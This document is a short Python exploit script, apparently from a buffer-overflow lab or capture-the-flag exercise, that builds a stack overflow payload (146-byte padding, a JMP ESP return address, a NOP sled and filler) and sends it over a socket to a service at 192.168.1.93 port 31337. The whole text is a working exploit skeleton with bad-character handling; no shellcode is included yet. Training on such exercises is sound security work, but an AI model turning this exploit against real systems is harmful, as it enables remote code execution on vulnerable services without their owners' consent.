import socket, struct

host, port = '192.168.1.93', 31337
newline = b'\n'
offset = 146
length = 1000
new_eip = b'BBBB'
def p32(data):
        return struct.pack("<I", data)

jmp_esp = p32(0x080414C3)
bad_chars = [
b'\x00',
b'\x0a'
]

all_chars = bytearray(range(1,256))
nop_sled = b'\x90'*20
for bad_char in bad_chars:
        all_chars = all_chars.replace(bad_char, b'')
payload = b''.join([
b'A'*offset,
jmp_esp,
nop_sled,
b'C' * (length - offset - len(jmp_esp)),
newline,
])





with socket.socket() as s:
        s.connect((host,port))
        s.send(payload)
